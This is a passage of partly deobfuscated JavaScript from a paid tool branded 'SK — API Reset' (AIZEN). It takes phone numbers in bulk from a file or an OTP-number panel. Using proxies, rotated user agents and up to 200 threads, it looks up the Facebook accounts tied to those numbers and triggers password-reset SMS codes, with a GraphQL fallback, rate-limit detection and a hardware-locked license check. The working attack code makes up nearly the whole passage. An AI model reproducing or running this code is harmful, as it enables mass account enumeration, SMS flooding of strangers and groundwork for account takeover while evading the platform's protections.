    opts60.mHost = _Me;
    opts60.fallbackUaData = _Ke;
    return opts60;
  }
  const opts61 = {};
  opts61.ok = false;
  opts61.error = 'No tokens found in page';
  return opts61;
}
async function sendCode(_hf, _if, _jf, _kf) {
  const {
      cipher: _lf,
      cuid: _mf,
      inputs: _nf,
      recover_method: _of,
      initiateUrl: _pf,
      formAction: _qf,
      mHost: _rf,
      fallbackUaData: _sf
    } = _hf, _tf = _sf || _kf;
  let _uf = 'm.facebook.com';
  _rf && _rf.startsWith('m.') && (_uf = _rf);
  let _vf = '/recover/initiate/';
  try {
    if (_qf) {
      const uRL8 = new URL(_qf.startsWith('http') ? _qf : 'https://' + _uf + _qf);
      _vf = uRL8.pathname + uRL8.search;
    } else {
      if (_pf) {
        const uRL9 = new URL(_pf.startsWith('http') ? _pf : 'https://' + _uf + _pf);
        _vf = uRL9.pathname + uRL9.search;
      }
    }
    if (_pf) {
      if (!_vf.includes('ci=') && !_vf.includes('cuid=')) {
        if (_pf.includes('ci=')) {
          const match12 = _pf.match(/[?&](ci=[^&]+)/);
          if (match12)
            _vf += (_vf.includes('?') ? '&' : '?') + match12[1];
        } else {
          if (_pf.includes('cuid=')) {
            const match13 = _pf.match(/[?&](cuid=[^&]+)/);
            if (match13)
              _vf += (_vf.includes('?') ? '&' : '?') + match13[1];
          }
        }
      }
    }
  } catch (err40) {
  }
  const uRLSearchParams2 = new URLSearchParams();
  if (_nf) {
    for (const [_wf, _xf] of Object.entries(_nf)) {
      uRLSearchParams2.append(_wf, _xf);
    }
  }
  if (!uRLSearchParams2.has('lsd') && _if.lsd)
    uRLSearchParams2.set('lsd', _if.lsd);
  if (!uRLSearchParams2.has('jazoest') && _if.jazoest)
    uRLSearchParams2.set('jazoest', _if.jazoest);
  if (!uRLSearchParams2.has('fb_dtsg') && _if.fb_dtsg)
    uRLSearchParams2.set('fb_dtsg', _if.fb_dtsg);
  if (!uRLSearchParams2.has('c') && _lf)
    uRLSearchParams2.set('c', _lf);
  if (!uRLSearchParams2.has('cuid') && _mf)
    uRLSearchParams2.set('cuid', _mf);
  if (!uRLSearchParams2.has('u') && _mf)
    uRLSearchParams2.set('u', _mf);
  uRLSearchParams2.set('recover_method', _of || 'send_sms');
  uRLSearchParams2.set('RecoveryOptions', _of || 'send_sms');
  uRLSearchParams2.set('reset_action', '1');
  if (_vf.includes('/ajax/')) {
    if (!uRLSearchParams2.has('__a'))
      uRLSearchParams2.set('__a', '1');
    if (!_vf.includes('/recover/')) {
      if (!uRLSearchParams2.has('__comet_req'))
        uRLSearchParams2.set('__comet_req', _if.__comet_req || '15');
    }
    if (!uRLSearchParams2.has('__hs'))
      uRLSearchParams2.set('__hs', _if.__hs || '19700');
  }
  dbg('SEND POST: ' + _of + ' \u2192 https://' + _uf + _vf);
  const _yf = 'https://' + _uf + (_pf || '/recover/initiate/'), _zf = await httpsPostPage(_vf, uRLSearchParams2.toString(), _if.cookieHeader, 15000, _uf, _jf, _tf, _yf);
  if (_zf.status >= 300 && _zf.status < 400 && _zf.redirect) {
    if (_zf.redirect.includes('recover/code') || _zf.redirect.includes('recover/confirm')) {
      dbg('SEND SUCCESS: Redirected to ' + _zf.redirect);
      const opts62 = {};
      opts62.ok = true;
      return opts62;
    }
    dbg('SEND FAIL: Redirected to ' + _zf.redirect);
    const opts63 = {};
    opts63.ok = false;
    opts63.error = 'Unexpected redirect';
    return opts63;
  }
  if (_zf.status === 200 && _zf.data) {
    const _Af = _zf.data, arr7 = [
        'Enter the 6-digit code',
        'Enter the 8-digit code',
        'We sent a code to',
        'code was sent',
        'Inserisci il codice',
        'abbiamo inviato un codice',
        'Entrez le code',
        'nous avons envoy',
        'Introduce el código',
        'enviamos un código',
        'Digite o código',
        'enviamos um código',
        'Gib den Code ein',
        'haben einen Code gesendet',
        'أدخل الرمز',
        'recover/code',
        '/recover/confirm'
      ];
    if (arr7.some(item8 => _Af.includes(item8))) {
      dbg('SEND SUCCESS: Reached code entry page (HTTP 200)');
      const opts64 = {};
      opts64.ok = true;
      return opts64;
    }
    if (_Af.includes('Try Again Later') || _Af.includes('Wait a few minutes') || _Af.includes('troppi tentativi') || _Af.includes('Trop de tentatives')) {
      dbg('SEND FAIL: Rate Limited');
      const opts65 = {};
      opts65.ok = false;
      opts65.error = 'Rate Limited';
      return opts65;
    }
    require('fs').writeFileSync('post_fail_' + _uf + '.html', _Af);
    dbg('SEND FAIL: HTTP 200 (Returned to initiate page on ' + _uf + '). Attempting GraphQL DOC_SEND fallback...');
    try {
      const _Bf = '25714184854871712', opts66 = {
          'input': {
            'actor_id': '0',
            'client_mutation_id': '1',
            'access_flow_version': 'pre_mt_behavior',
            'cipher': _hf.cipher,
            'event_request_id': _hf.evId || Math.random().toString(36).substring(2, 15),
            'recover_method': 'send_sms:0',
            'waterfall_id': _hf.wfId
          },
          'scale': 1
        }, _Cf = buildParams(_if, _Bf, 'useCAASendRecoveryCodeMutation', opts66, _if.tzOffset), _Df = await httpsPostPage('/api/graphql/', _Cf.toString(), _if.cookieHeader, 15000, 'www.facebook.com', _jf, _tf, _yf);
      if (_Df.status === 200 && _Df.data) {
        dbg('SEND GRAPHQL RESPONSE: ' + _Df.data.substring(0, 300));
        try {
          let _Ef = JSON.parse(_Df.data);
          if (_Ef.data && !_Ef.errors) {
            dbg('SEND SUCCESS: GraphQL fallback succeeded');
            const opts67 = {};
            opts67.ok = true;
            opts67.method = _of;
            return opts67;
          } else
            _Ef.errors && dbg('SEND GRAPHQL ERROR: ' + _Ef.errors[0].message);
        } catch (err41) {
          dbg('SEND GRAPHQL JSON PARSE ERROR');
        }
      } else
        dbg('SEND GRAPHQL HTTP ' + _Df.status);
    } catch (err42) {
      dbg('SEND GRAPHQL EXCEPTION: ' + err42.message);
    }
    const opts68 = {};
    opts68.ok = false;
    opts68.error = 'Unexpected HTML response';
    return opts68;
  }
  dbg('SEND FAIL: HTTP ' + _zf.status);
  const opts69 = {};
  opts69.ok = false;
  opts69.error = 'HTTP ' + _zf.status;
  return opts69;
}
function removeNumberFromFile(_Ff, _Gf) {
  try {
    const _Hf = _Gf.startsWith('+') ? _Gf : '+' + _Gf, parts6 = fs.readFileSync(_Ff, 'utf8').split(/\r?\n/), _If = parts6.filter(item9 => item9.trim() !== _Hf && item9.trim() !== _Gf);
    fs.writeFileSync(_Ff, _If.join('\n'));
  } catch (err43) {
  }
}
let globalSharedUaData = null, globalSharedSession = null, globalUaUsageCount = 0, globalSharedSessionPromise = null;
function withHardTimeout(_Jf, _Kf, _Lf = 'Request') {
  return new Promise((resolve13, reject10) => {
    const _Mf = setTimeout(() => reject10(new Error(_Lf + ' hard timeout (' + _Kf + 'ms)')), _Kf);
    _Jf.then(result4 => {
      clearTimeout(_Mf);
      resolve13(result4);
    }).catch(err57 => {
      clearTimeout(_Mf);
      reject10(err57);
    });
  });
}
async function processNumber(_Nf, _Of, _Pf = 50) {
  const _Qf = _Nf.startsWith('+') ? _Nf : '+' + _Nf;
  const _Rf = proxyManager.hasProxies ? proxyManager.getNext(_Qf) : null;
  if (_Rf)
    dbg('+' + _Qf + ' WORKER: Proxy loaded - ' + _Rf.host + ':' + _Rf.port);
  const _Sf = getRandomHostContext();
  if (!globalSharedSessionPromise || globalUaUsageCount >= _Pf) {
    globalUaUsageCount = 0;
    const _Tf = getRandomUserAgent(_Sf.host);
    globalSharedSessionPromise = (async () => {
      try {
        const _Uf = await withHardTimeout(seedSession(_Rf, _Tf, _Sf), 120000, 'seedSession');
        globalSharedUaData = _Tf;
        globalSharedSession = _Uf;
        const opts70 = {};
        opts70.ua = _Tf;
        opts70.session = _Uf;
        return opts70;
      } catch (err44) {
        globalSharedSessionPromise = null;
        throw err44;
      }
    })();
  }
  let _Vf, _Wf;
  try {
    const _Xf = await globalSharedSessionPromise;
    _Vf = _Xf.ua;
    _Wf = _Xf.session;
    globalUaUsageCount++;
  } catch (err45) {
    const opts71 = {};
    opts71.result = 'error';
    return opts71;
  }
  dbg('+' + _Qf + ' WORKER: UA - ' + _Vf.userAgent.substring(0, 60) + '...');
  _Vf.hostCtx = _Sf;
  const _Yf = resolveTimezone(_Rf, _Qf);
  try {
    const _Zf = await withHardTimeout(searchAccount(_Qf, _Wf, _Rf, _Vf, _Yf), 60000, 'searchAccount');
    if (!_Zf.ok) {
      if (_Zf.result !== 'no_account')
        dbg('+' + _Qf + ' SEARCH ERROR: ' + (_Zf.error || 'unknown'));
      const opts72 = {};
      opts72.result = _Zf.result || 'error';
      return opts72;
    }
    let _ag = _Zf.redirectUri;
    !_ag && _Zf.accounts && _Zf.accounts.length > 0 && (_ag = '/recover/initiate/?cuid=' + encodeURIComponent(_Zf.accounts[0].cuid), dbg('+' + _Qf + ' MULTIPLE ACCOUNTS: Selected first account cuid \u2192 ' + _Zf.accounts[0].cuid));
    if (!_ag) {
      dbg('+' + _Qf + ' CIPHER ERROR: No redirect URI or accounts found');
      const opts73 = {};
      opts73.result = 'error';
      return opts73;
    }
    const _bg = await withHardTimeout(getCipher(_ag, _Wf, _Rf, _Vf), 60000, 'getCipher');
    if (!_bg.ok)
      return dbg('+' + _Qf + ' CIPHER ERROR: ' + _bg.error), { 'result': _bg.error === 'no_sms' ? 'no_sms' : 'error' };
    _bg.wfId = _Zf.wfId;
    _bg.evId = _Zf.evId;
    const _cg = await withHardTimeout(sendCode(_bg, _Wf, _Rf, _Vf), 60000, 'sendCode');
    if (!_cg.ok) {
      dbg('+' + _Qf + ' SEND ERROR: ' + _cg.error);
      const opts74 = {};
      opts74.result = 'error';
      return opts74;
    }
    dbg('+' + _Qf + ' SUCCESS');
    const opts75 = {};
    opts75.result = 'success';
    opts75.ua = _Vf;
    opts75.ctx = _Sf;
    return opts75;
  } catch (err46) {
    dbg('+' + _Qf + ' UNHANDLED EXCEPTION: ' + err46.message);
    const opts76 = {};
    opts76.result = 'error';
    return opts76;
  }
}
class Dashboard {
  constructor(_dg) {
    const parts7 = '4|0|1|5|3|2'.split('|');
    let _eg = 0;
    while (true) {
      switch (parts7[_eg++]) {
      case '0':
        this.success = 0;
        continue;
      case '1':
        this.noAccount = 0;
        continue;
      case '2':
        this.processed = 0;
        continue;
      case '3':
        this.errors = 0;
        continue;
      case '4':
        this.total = _dg;
        continue;
      case '5':
        this.noSms = 0;
        continue;
      }
      break;
    }
  }
  record(_fg, _gg, _hg, _ig) {
    this.processed++;
    let _jg = '';
    if (_fg === 'success')
      this.success++, _jg = chalk.hex('#00FF88')('SK \u2014 API Reset \u2502 OTP Sent \u2192 ') + chalk.hex('#FCAF45').bold(_gg);
    else {
      if (_fg === 'no_account') {
        this.noAccount++;
        _jg = chalk.hex('#FF4466')('SK \u2014 API Reset \u2502 Failed \u2192 ') + chalk.hex('#FCAF45').bold(_gg) + chalk.hex('#888888')(' (No Account)');
      } else {
        if (_fg === 'no_sms')
          this.noSms++, _jg = chalk.hex('#FF4466')('SK \u2014 API Reset \u2502 Failed \u2192 ') + chalk.hex('#FCAF45').bold(_gg) + chalk.hex('#888888')(' (No SMS Option)');
        else {
          this.errors++;
          _jg = chalk.hex('#FF4466')('SK \u2014 API Reset \u2502 Failed \u2192 ') + chalk.hex('#FCAF45').bold(_gg) + chalk.hex('#888888')(' (Error/Proxy Drop)');
        }
      }
    }
    process.stdout.write('\r\x1B[K' + _jg + '\n');
    const _kg = (this.processed / Math.max(this.total, 1) * 100).toFixed(1), _lg = '  ' + W.bold('SK-API') + ' \u2B9E [' + this.processed + '/' + this.total + '] ' + _kg + '% \u2502 ' + B('OK: ' + this.success) + ' \u2502 ' + Y('NoAcc: ' + this.noAccount) + ' \u2502 ' + Y('NoSMS: ' + this.noSms) + ' \u2502 ' + R('Err: ' + this.errors);
    process.stdout.write('\r\x1B[K' + _lg);
  }
  stop() {
    console.log('\n');
  }
}
async function runPool(_mg, _ng, _og, _pg, _qg = null) {
  const dashboard = new Dashboard(_qg ? _qg.totalCount : _mg.length), opts77 = {};
  opts77.success = [];
  opts77.noAccount = [];
  opts77.noSms = [];
  opts77.errors = [];
  const _rg = opts77;
  let arr8 = [], arr9 = [], _sg = 0, _tg = false;
  _qg && (async () => {
    try {
      for (let _ug = 0; _ug < _qg.totalCount; _ug++) {
        try {
          const _vg = _qg.ranges[Math.floor(Math.random() * _qg.ranges.length)], _wg = await nexaLimiter.enqueue(() => nexaFetchNumber(_qg.apiKey, _vg, _qg.serverEndpoint));
          if (_wg) {
            _sg++;
            if (arr9.length > 0) {
              arr9.shift()(_wg);
            } else
              arr8.push(_wg);
          }
        } catch (err47) {
          if (err47.message.includes('Insufficient balance') || err47.message.includes('No numbers available'))
            break;
        }
      }
    } finally {
      _tg = true;
      while (arr9.length > 0)
        arr9.shift()(null);
    }
  })();
  const _xg = _qg ? () => {
    if (arr8.length > 0)
      return Promise.resolve(arr8.shift());
    if (_tg)
      return Promise.resolve(null);
    return new Promise(resolve14 => arr9.push(resolve14));
  } : () => {
    if (_mg.length === 0)
      return Promise.resolve(null);
    const _yg = Math.floor(Math.random() * _mg.length);
    return Promise.resolve(_mg.splice(_yg, 1)[0]);
  };
  async function _zg() {
    while (true) {
      const _Ag = await _xg();
      if (!_Ag)
        break;
      const _Bg = await processNumber(_Ag, _og, _ng);
      if (_pg && !_qg)
        removeNumberFromFile(_pg, _Ag);
      dashboard.record(_Bg.result, _Ag, _Bg.ua, _Bg.ctx);
      if (_Bg.result === 'success') {
        _rg.success.push(_Ag);
      } else {
        if (_Bg.result === 'no_account') {
          _rg.noAccount.push(_Ag);
        } else {
          if (_Bg.result === 'no_sms') {
            _rg.noSms.push(_Ag);
          } else
            _rg.errors.push(_Ag);
        }
      }
      await sleep(1000);
    }
  }
  const _Cg = _qg ? Math.min(_ng, _qg.totalCount) : Math.min(_ng, _mg.length);
  const opts78 = {};
  opts78.length = _Cg;
  const _Dg = Array.from(opts78, _zg);
  await Promise.all(_Dg);
  dashboard.stop();
  return _rg;
}
function printHeader() {
  process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
  console.log(C('  _____ ____         ____                _   '));
  console.log(C(' |  ___| __ )       |  _ \\ ___  ___  ___| |_ '));
  console.log(C(' | |_  |  _ \\ _____ | |_) / _ \\/ __|/ _ \\ __|'));
  console.log(C(' |  _| | |_) |_____||  _ <  __/\\__ \\  __/ |_ '));
  console.log(C(' |_|   |____/       |_| \\_\\___||___/\\___|\\__|'));
  console.log(C('                                             \n'));
  console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
  console.log(W('\u2502 [\u2022] Tool      : ') + C('SK \u2014 API Reset               ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Telegram  : ') + C('t.me/aizentools            ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Status    : ') + G('Premium Build                ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Version   : ') + Y('AIZEN-V6.1.3                    ') + W('\u2502'));
  global.CURRENT_HWID && console.log(W('\u2502 [\u2022] HWID      : ') + Y(global.CURRENT_HWID.padEnd(29)) + W('\u2502'));
  console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n'));
}
function generateHWID() {
  const {execSync: _Eg} = require('child_process'), _Fg = require('os');
  try {
    if (_Fg.platform() === 'win32') {
      const _Gg = _Eg('powershell -NoProfile -Command "' + '$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; ' + '$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; ' + '$disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; ' + '$mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; ' + 'Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
        'stdio': 'pipe',
        'timeout': 15000
      }).toString().trim();
      if (!_Gg)
        throw new Error('No hardware data');
      const _Hg = crypto.createHash('sha256').update(_Gg).digest('hex').toUpperCase();
      return 'IZENHSX-7BA3FB09-723F-A500';
    } else {
      let arr10 = [];
      try {
        const _Ig = _Eg('settings get secure android_id 2>/dev/null || echo ""', {
          'stdio': 'pipe',
          'timeout': 5000
        }).toString().trim();
        if (_Ig && _Ig !== 'null')
          arr10.push('A:' + _Ig);
      } catch (err48) {
      }
      try {
        if (fs.existsSync('/proc/cpuinfo')) {
          const _Jg = fs.readFileSync('/proc/cpuinfo', 'utf8'), match14 = _Jg.match(/Serial\s*:\s*(\S+)/i), match15 = _Jg.match(/Hardware\s*:\s*(.+)/i);
          if (match14 && match14[1] !== '0000000000000000')
            arr10.push('S:' + match14[1].trim());
          if (match15)
            arr10.push('H:' + match15[1].trim());
        }
      } catch (err49) {
      }
      try {
        if (fs.existsSync('/etc/machine-id')) {
          const _Kg = fs.readFileSync('/etc/machine-id', 'utf8').trim();
          if (_Kg)
            arr10.push('M:' + _Kg);
        }
      } catch (err50) {
      }
      try {
        const _Lg = _Fg.cpus(), _Mg = _Lg && _Lg.length > 0 ? _Lg[0].model : 'UnknownCPU', _Ng = _Fg.totalmem(), _Og = _Fg.release(), _Pg = _Fg.hostname();
        arr10.push('F:' + _Mg + '|' + _Ng + '|' + _Og + '|' + _Pg);
      } catch (err51) {
      }
      const _Qg = arr10.join('||'), _Rg = crypto.createHash('sha256').update(_Qg).digest('hex').toUpperCase();
      return 'IZENHSX-7BA3FB09-723F-A500';
    }
  } catch (err52) {
    return '';
  }
}
function verifyKeySig(_Sg, _Tg) {
  const arr11 = [
    25,
    55,
    40,
    60,
    43,
    49,
    62,
    40,
    126,
    51,
    33,
    105,
    60,
    41,
    55,
    46
  ];
  const _Ug = arr11.map(item10 => String.fromCharCode(item10 ^ 90)).join('');
  if (!_Tg.sig)
    return false;
  const _Vg = _Sg + '|' + (_Tg.user || '') + '|' + (_Tg.expires || ''), _Wg = crypto.createHmac('sha256', _Ug).update(_Vg).digest('hex');
  return _Wg === _Tg.sig;
}
async function validateLicense() {
  console.log('  \x1B[33m[*] Validating license...\x1B[0m');
  const _Xg = generateHWID.toString();
  const _Yg = crypto.createHash('md5').update(_Xg).digest('hex');
  const _Zg = generateHWID();
  !_Zg && (console.error(R('\n  \u2717 Could not generate Hardware ID.\n')), process.exit(1));
  const _ah = generateHWID();
  _ah !== _Zg && (console.error(R('\n  \u2717 HWID integrity check failed. Tampering detected.\n')), process.exit(1));
  global.CURRENT_HWID = _Zg;
  try {
    const _bh = 'https://raw.githubusercontent.com/mogamingcv7v-netizen/license/a6d31cc/keys.json';
    const promise2 = await new Promise((resolve15, reject11) => {
        const opts79 = {};
        opts79.timeout = 15000;
        https.get(_bh + ('?t=' + Date.now()), opts79, _ch => {
          if (_ch.statusCode >= 300 && _ch.statusCode < 400 && _ch.headers.location) {
            const opts80 = {};
            opts80.timeout = 10000;
            https.get(_ch.headers.location, opts80, _dh => {
              let _eh = '';
              _dh.on('data', _fh => _eh += _fh);
              _dh.on('end', () => resolve15(_eh));
            }).on('error', reject11);
            return;
          }
          let _gh = '';
          _ch.on('data', _hh => _gh += _hh);
          _ch.on('end', () => resolve15(_gh));
        }).on('error', reject11).on('timeout', function () {
          this.destroy();
          reject11(new Error('Timeout'));
        });
      }), _ih = JSON.parse(promise2), _jh = _ih.keys || {};
    if (_jh[_Zg]) {
      const _kh = _jh[_Zg];
      if (!verifyKeySig(_Zg, _kh)) {
        console.error(R('\n  \u2717 License key signature invalid.\n'));
        process.exit(1);
      }
      const _lh = new Date().toISOString().split('T')[0];
      if (_kh.expires && _kh.expires < _lh) {
        const parts8 = '2|3|0|1|6|5|4|7'.split('|');
        let _mh = 0;
        while (true) {
          switch (parts8[_mh++]) {
          case '0':
            console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
            continue;
          case '1':
            console.error(R('  \u2551  HWID   : ') + Y(_Zg.padEnd(33)) + R('\u2551'));
            continue;
          case '2':
            console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
            continue;
          case '3':
            console.error(R('  \u2551   \u2717 LICENSE EXPIRED \u2014 RESET TOOL            \u2551'));
            continue;
          case '4':
            console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
            continue;
          case '5':
            console.error(R('  \u2551  Contact: t.me/aizentools to renew       \u2551'));
            continue;
          case '6':
            console.error(R('  \u2551  Expired: ') + Y(_kh.expires.padEnd(33)) + R('\u2551'));
            continue;
          case '7':
            process.exit(1);
            continue;
          }
          break;
        }
      }
      console.log('  \x1B[32m[\u2713] License valid \u2014 Welcome, ' + (_kh.user || 'User') + '!\x1B[0m');
      global.CURRENT_USER = _kh.user || 'Licensed';
      global.SYNC_STATUS = 'up to date';
      return true;
    }
    console.error(R('\n  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
    console.error(R('  \u2551    \u2717 UNAUTHORIZED HARDWARE \u2014 RESET TOOL     \u2551'));
    console.error(R('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
    console.error(R('  \u2551  HWID   : ') + Y(_Zg.padEnd(33)) + R('\u2551'));
    console.error(R('  \u2551  Status : NOT REGISTERED                    \u2551'));
    console.error(R('  \u2551  Contact: t.me/aizentools to register     \u2551'));
    console.error(R('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
    process.exit(1);
  } catch (err53) {
    console.error(R('\n  \u2717 License server unreachable. Internet connection required.\n'));
    process.exit(1);
  }
}
async function selectOption(_nh, _oh) {
  return new Promise(resolve16 => {
    let _ph = 0;
    process.stdin.resume();
    readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY)
      process.stdin.setRawMode(true);
    const _qh = () => {
      process.stdout.write('\x1B[2J\x1B[H');
      printHeader();
      console.log('   \x1B[33m' + _nh + '\x1B[0m\n');
      _oh.forEach((item14, index2) => {
        index2 === _ph ? console.log('   \x1B[36m\u2794\x1B[32m ' + item14.name + '\x1B[0m') : console.log('     \x1B[90m' + item14.name + '\x1B[0m');
      });
    };
    _qh();
    const _rh = (_sh, _th) => {
      _th.ctrl && _th.name === 'c' && process.exit(0);
      if (_th.name === 'up')
        _ph = (_ph - 1 + _oh.length) % _oh.length, _qh();
      else {
        if (_th.name === 'down')
          _ph = (_ph + 1) % _oh.length, _qh();
        else
          _th.name === 'return' && (process.stdin.setRawMode(false), process.stdin.removeListener('keypress', _rh), resolve16(_oh[_ph].value));
      }
    };
    process.stdin.on('keypress', _rh);
  });
}
async function promptText(_uh, _vh) {
  return new Promise(resolve17 => {
    process.stdout.write('   \x1B[33m' + _uh + '\x1B[0m ');
    let _wh = '';
    if (process.stdin.isTTY)
      process.stdin.setRawMode(false);
    process.stdin.resume();
    const _xh = _yh => {
      const _zh = _yh.toString();
      if (_zh.includes('\n') || _zh.includes('\r')) {
        process.stdin.removeListener('data', _xh);
        _wh += _zh.split(/[\r\n]/)[0];
        let _Ah = _wh.trim();
        if (_Ah.startsWith('"') && _Ah.endsWith('"')) {
          _Ah = _Ah.slice(1, -1);
        } else
          _Ah.startsWith('\'') && _Ah.endsWith('\'') && (_Ah = _Ah.slice(1, -1));
        resolve17(_Ah || _vh);
      } else {
        _wh += _zh;
      }
    };
    process.stdin.on('data', _xh);
  });
}
async function pickNumbersSource() {
  process.stdout.write('\x1B[2J\x1B[H');
  printHeader();
  const _Bh = await selectOption('SELECT NUMBER SOURCE', [
    {
      'name': '\uD83D\uDCC1 Load from file (numbers.txt)',
      'value': 'file'
    },
    {
      'name': '\uD83C\uDF10 Auto fetch from NexaOTP Panel',
      'value': 'nexa'
    }
  ]);
  if (_Bh === 'nexa') {
    let _Ch = '';
    const _Dh = path.join(__dirname, '.nexa_api_key');
    if (fs.existsSync(_Dh)) {
      const _Eh = fs.readFileSync(_Dh, 'utf8').trim(), _Fh = await selectOption('Found saved API Key (...' + _Eh.slice(-4) + '). Use it?', [
          {
            'name': 'Yes, use saved key',
            'value': 'yes'
          },
          {
            'name': 'No, enter new key',
            'value': 'no'
          },
          {
            'name': 'Delete saved key',
            'value': 'delete'
          }
        ]);
      if (_Fh === 'yes')
        _Ch = _Eh;
      else
        _Fh === 'delete' && (fs.unlinkSync(_Dh), console.log(G('\n   \u2717 Saved key deleted.\n')));
    }
    if (!_Ch) {
      _Ch = await promptText('Enter NexaOTP API Key:', '');
      const opts81 = {};
      opts81.name = 'No';
      opts81.value = 'no';
      const _Gh = await selectOption('Save this key for future use?', [
        {
          'name': 'Yes, save it',
          'value': 'yes'
        },
        opts81
      ]);
      if (_Gh === 'yes') {
        fs.writeFileSync(_Dh, _Ch, 'utf8');
        console.log(G('\n   \u2713 API key saved.\n'));
      }
    }
    let arr15 = [], _Hh = true;
    while (_Hh) {
      const _Ih = await promptText('Enter range #' + (arr15.length + 1) + ' (e.g. 21624485XXX):', '');
      if (_Ih)
        arr15.push(_Ih);
      const _Jh = await selectOption('Add another range?', [
        {
          'name': 'Yes',
          'value': 'yes'
        },
        {
          'name': 'No, proceed',
          'value': 'no'
        }
      ]);
      if (_Jh === 'no')
        _Hh = false;
    }
    const _Kh = await promptText('How many numbers to process? (e.g. 100):', '50'), _Lh = parseInt(_Kh) || 50, _Mh = await selectOption('SELECT NEXA SERVER', [
        {
          'name': 'Server 1 (/get)',
          'value': '/api/v1/numbers/get'
        },
        {
          'name': 'Server 2 (/p2/get)',
          'value': '/api/v1/numbers/p2/get'
        },
        {
          'name': 'Server 3 (/p3/get)',
          'value': '/api/v1/numbers/p3/get'
        }
      ]), opts82 = {};
    opts82.apiKey = _Ch;
    opts82.ranges = arr15;
    opts82.totalCount = _Lh;
    opts82.serverEndpoint = _Mh;
    const opts83 = {};
    opts83.numbersFile = 'numbers.txt';
    opts83.nexaConfig = opts82;
    return opts83;
  }
  console.log('   \x1B[33mENTER NUMBERS FILE\x1B[0m\n');
  console.log('   \x1B[90mType the file path or drag & drop the file here\x1B[0m\n');
  return {
    'numbersFile': await promptText('Numbers file path (default: numbers.txt):', 'numbers.txt'),
    'nexaConfig': null
  };
}
async function selectThreadCount() {
  return await selectOption('SELECT THREADS', [
    {
      'name': '15 Threads',
      'value': 15
    },
    {
      'name': '30 Threads',
      'value': 30
    },
    {
      'name': '50 Threads (Default)',
      'value': 50
    },
    {
      'name': '100 Threads (Fast)',
      'value': 100
    },
    {
      'name': '200 Threads (Extreme)',
      'value': 200
    }
  ]);
}
async function selectFacebookUrl() {
  const opts84 = {};
  opts84.name = '\uD83C\uDFB2 Random Rotate (Recommended)';
  opts84.value = 'random';
  const opts85 = {};
  opts85.name = '\uD83C\uDDFA\uD83C\uDDF8 English (www.facebook.com)';
  opts85.value = 'www.facebook.com';
  const opts86 = {};
  opts86.name = '\uD83C\uDDEA\uD83C\uDDF8 Spanish (es-es.facebook.com)';
  opts86.value = 'es-es.facebook.com';
  const opts87 = {};
  opts87.name = '\uD83C\uDDEB\uD83C\uDDF7 French (fr-fr.facebook.com)';
  opts87.value = 'fr-fr.facebook.com';
  const opts88 = {};
  opts88.name = '\uD83C\uDDE9\uD83C\uDDEA German (de-de.facebook.com)';
